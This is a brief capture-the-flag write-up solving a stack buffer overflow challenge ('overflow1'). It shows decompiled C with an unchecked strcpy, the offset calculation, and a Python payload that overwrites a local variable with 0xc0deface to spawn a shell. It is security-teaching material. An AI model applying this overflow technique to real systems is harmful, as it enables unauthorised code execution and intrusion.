### S0lv3d by H4yicl3

Try to download it 


I use IDA to analysis the code
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  if ( argc > 1 )
    vuln((char *)argv[1]);
  return 0;
}
int __cdecl vuln(char *src)
{
  int result; // eax@2
  char dest; // [sp+1Ch] [bp-1Ch]@1
  int v3; // [sp+2Ch] [bp-Ch]@1

  v3 = 0;
  strcpy(&dest, src);
  if ( v3 == 0xC0DEFACE )	<----- modify v3 to 0xc0deface ! we have shell
    result = give_shell();
  else
    result = printf("The secret is %x\n", v3);
  return result;
}
```

double click dest and v3 to find the offset in IDA
```
-0000001C dest            db ?
-0000000C var_C           dd ?
```
offset = 0x1c -0xC = 0x10 =16

try to modify v3 to 0xc0deface
```
padding ="A"*16
v3 = "\xce\xfa\xde\xc0"
print padding +v3
```

try run it
```
./overflow1 $(python overflow1.py)
$ whoami
hayicle
$ 
```

well done
